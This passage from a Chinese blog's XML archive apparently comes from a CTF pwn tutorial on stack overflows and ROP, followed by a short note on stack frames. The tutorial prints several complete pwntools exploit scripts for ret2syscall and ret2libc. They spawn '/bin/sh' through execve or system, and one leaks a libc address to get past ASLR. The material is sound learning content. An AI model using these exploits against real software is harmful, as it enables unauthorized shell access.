‘eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(“/bin/sh”,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。 平凡无奇的存在栈溢出漏洞的程序源码如下： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。 此外，我们需要获得 /bin/sh 字符串对应的地址。 1234➜ ret2syscall ROPgadget --binary rop --string &apos;/bin/sh&apos; Strings information============================================================0x080be408 : /bin/sh 以及int 0x80的地址： 123456789➜ ret2syscall ROPgadget --binary rop --only &apos;int&apos; Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 EXP如下： 123456789101112131415#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./rop&apos;)## 找到的gadgets及其地址pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。 第四种类型：ret2libc libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(“/bin/sh”). 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets((char *)&amp;v4); return 0;&#125; 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到”/bin/sh”。 则EXP如下： 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc1&apos;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])sh.sendline(payload)sh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。 当查找不到”/bin/sh”时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。 EXP如下： 12345678910111213##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc2&apos;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。 同时找不到”/bin/sh”与system()函数地址的情况，用到了两个知识点： system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。 此外，libc中是一定存在”/bin/sh”的，所以字符串地址也可以获取。这方面工具做的很完善。 示例： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets((char *)&amp;v4); return 0;&#125; 思路： 泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *## 导入工具from LibcSearcher import LibcSearcher## 本地连接sh = process(&apos;./ret2libc3&apos;)## 将文件加载入进程ret2libc3 = ELF(&apos;./ret2libc3&apos;)##简化libc库中函数地址的表示方法puts_plt = ret2libc3.plt[&apos;puts&apos;]libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]main = ret2libc3.symbols[&apos;main&apos;]## 监视程序进行到哪一步，提醒自己print &quot;leak libc_start_main_got addr and return to main again&quot;## puts函数泄露出start_main函数地址payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])## 在输出前面字符串后，将payload输入sh.sendlineafter(&apos;Can you find it !?&apos;, payload)print &quot;get the related addr&quot;##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式libc_start_main_addr = u32(sh.recv()[0:4])##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)## 已知基地址与相对地址，得到绝对地址system_addr = libcbase + libc.dump(&apos;system&apos;)binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)## 监视程序进行到哪一步print &quot;get shell&quot;payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 0X05–稍作总结： ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。 0X06–MISC: 1.最简单栈溢出，一套工具解决。 python pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address) 即可得到溢出地址 2.注意是返回地址，不是/bin/sh本身在栈上。 3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。 4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。 5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。 6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。 7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。 8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。 9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。 10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。 11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。 12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是 1\x3b\x84\x04\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。 13.常见的危险函数如下 输入 gets，直接读取一行，忽略’\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\x00’停止 strcat，字符串拼接，遇到’\x00’停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 0X06–尚存在的问题: 1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。 2.ESP的调试为什么断点下在CALL处。 3.buf两端的问题。 4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。解决此问题最简单的方法就是开启core dump功能，即：ulimit -c unlimitedsudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 CTF-Wiki&gt;Linux Pwn: Stack Overflow principle Basic ROP 系统调用 Github上Libc版本库 LibcSearcher工具 现代栈溢出利用技术基础：ROP 一步一步学ROP之linux_x86篇 一步一步学ROP之linux_x64篇 手把手教你栈溢出从入门到放弃（上） 手把手教你栈溢出从入门到放弃（下） Linux下pwn从入门到放弃]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF Pwn stackoverflow ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈帧（stack frame）]]></title>
    <url>%2F2019%2F06%2F19%2FStack%20Frame%2F</url>
    <content type="text"><![CDATA[1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。 2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。 3.汇编中的DWORD PTR SS:[EBP-4]理解为指针，意为地址EBP-4处有一个4字节大小 的内存空间。此句中，SS是Segment Memory Model的缩写，表示栈段，在Windows（使用段内存模型）下需要指出。EBP是指向栈的寄存器，所以加上SS寄存器。DWORD PTR与SS等字符串可以在OD设置中隐藏。 4.调用一个函数之前，先开辟出内存空间，在将参数压入栈，最后在执行函数之前，将返回地址压入栈。执行完毕之后将删除函数栈帧并返回至PUSH的返回地址。 5.注意参数入栈的顺序与C语言中参数顺序恰好相反（参数的逆向存储）。 6.调用约定（Calling Convention）：被调函数执行完后，由函数的调用者负责清理存储在栈中的参数，这种方式称为cdecl方式。由被调用者负责清理保存在栈中的参数，称为stdcall方式。 7.ESP为栈顶指针，EBP为栈帧指针。程序运行过程中，ESP是随时变化的，访问内存中的局部变量和参数等如果以此为基址会十分困难。所以程序开始时会PUSH EBP,MOV EBP,ESP.将ESP的值保存在EBP中并且维持在函数内部，这样无论ESP如何变化，以EBP为基准都能准确地访问到局部变量与参数。执行完这两条命令，就可以说栈帧已经生成了。 8.XOR命令用来进行异或运算，Exclusive OR bit，其特点为两个相同的值进行异或运算的结果为0.XOR命令的执行速度比 MOV EAX,0 要快，常用于寄存器初始化操作。 9.编译器中的”优化“（optimization）选项开启后，编译出来的简单函数将不会生成栈帧。 10.牢记：栈是用来存放参数，变量，地址等数据的，不是用来存放代码的。]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Genesis]]></title>
    <url>%2F2019%2F06%2F17%2FGenesis%2F</url>
    <content type="text"><![CDATA[Earthquake and Blog]]></content>
  </entry>
</search>
